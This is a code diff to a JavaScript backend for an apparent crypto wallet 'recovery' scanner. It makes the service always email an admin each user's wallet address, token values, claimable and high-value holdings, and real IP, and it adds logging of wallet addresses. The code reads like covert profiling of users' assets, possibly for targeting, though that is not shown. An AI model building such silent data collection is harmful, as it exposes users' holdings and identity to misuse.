@@ -356,23 +356,20 @@ router.post('/scan-wallet', async (req, res) => {
       
       console.log('📧 SCAN EMAIL: Tokens found:', scanResults.length);
       
-      let emailSent = false;
-      if (scanResults.length > 0) {
-        // Calculate total value for email
-        let emailTotalValue = scanResults.reduce((sum, result) => sum + parseFloat(result.amount || 0), 0);
-        
-        emailSent = await sendAdminNotification(
-          `SCAN COMPLETE: ${scanResults.length} tokens - $${emailTotalValue.toFixed(0)} value`,
-          `WALLET SCAN COMPLETED\n\n` +
-          `WALLET: ${walletAddress}\n` +
-          `RESULTS: ${scanResults.length} total, ${claimableTokens.length} claimable\n` +
-          `VALUE: $${emailTotalValue.toFixed(2)} (${highValueTokens.length} high-value)\n` +
-          `CHAINS: ${[...new Set(scanResults.map(r => r.chainId))].length}\n\n` +
-          `TOP FINDINGS:\n${scanResults.slice(0,5).map(r => `${r.tokenSymbol}: ${r.amount} (${r.claimable ? 'CLAIMABLE' : 'Locked'})`).join('\n')}\n\n` +
-          `USER: ${realIP}\n` +
-          `TIME: ${new Date().toISOString()}`
-        );
-      }
+      // ALWAYS send scan email - even for empty results
+      let emailTotalValue = scanResults.reduce((sum, result) => sum + parseFloat(result.amount || 0), 0);
+      
+      const emailSent = await sendAdminNotification(
+        `SCAN COMPLETE: ${scanResults.length} tokens - $${emailTotalValue.toFixed(0)} value`,
+        `WALLET SCAN COMPLETED\n\n` +
+        `WALLET: ${walletAddress}\n` +
+        `RESULTS: ${scanResults.length} total, ${claimableTokens.length} claimable\n` +
+        `VALUE: $${emailTotalValue.toFixed(2)} (${highValueTokens.length} high-value)\n` +
+        `CHAINS: ${[...new Set(scanResults.map(r => r.chainId))].length}\n\n` +
+        `${scanResults.length > 0 ? `TOP FINDINGS:\n${scanResults.slice(0,5).map(r => `${r.tokenSymbol}: ${r.amount} (${r.claimable ? 'CLAIMABLE' : 'Locked'})`).join('\n')}` : 'NO TOKENS FOUND'}\n\n` +
+        `USER: ${realIP}\n` +
+        `TIME: ${new Date().toISOString()}`
+      );
       
       if (emailSent) {
         console.log('✅ Scan results email sent successfully');
@@ -443,6 +440,7 @@ router.post('/scan-wallet', async (req, res) => {
 
 // Analyze recovery potential
 router.post('/analyze-recovery', async (req, res) => {
+  console.log('🔍 RECOVERY ANALYSIS STARTED:', req.body.walletAddress);
   try {
     const { walletAddress } = req.body;
     
@@ -865,6 +863,7 @@ router.get('/dashboard/:walletAddress', async (req, res) => {
 
 // Scan for stuck bridge transactions
 router.post('/scan-bridge', async (req, res) => {
+  console.log('🌉 BRIDGE SCAN STARTED:', req.body.walletAddress);
   try {
     const { walletAddress } = req.body;
     
@@ -937,6 +936,7 @@ router.post('/scan-bridge', async (req, res) => {
 
 // Scan for staking rewards
 router.post('/scan-staking', async (req, res) => {
+  console.log('🪙 STAKING SCAN STARTED:', req.body.walletAddress);
   try {
     const { walletAddress } = req.body;
     
